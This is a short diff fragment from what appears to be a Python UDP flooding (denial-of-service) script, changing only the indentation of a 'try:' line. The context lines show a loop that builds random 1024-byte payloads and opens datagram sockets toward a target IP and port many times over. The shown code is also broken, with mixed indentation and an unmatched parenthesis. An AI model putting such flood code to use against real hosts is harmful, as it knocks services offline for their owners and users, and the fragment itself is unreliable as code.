@@ -37,7 +37,7 @@ def run():
 	   data = random._urandom(1024) 
 	   i = random.choice(("[+]"," [-]","[•]")) 
 	   while True:
-		  try:
+		   try:
 			  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
               addr = str(ip),int(port))
               for x in range (times):
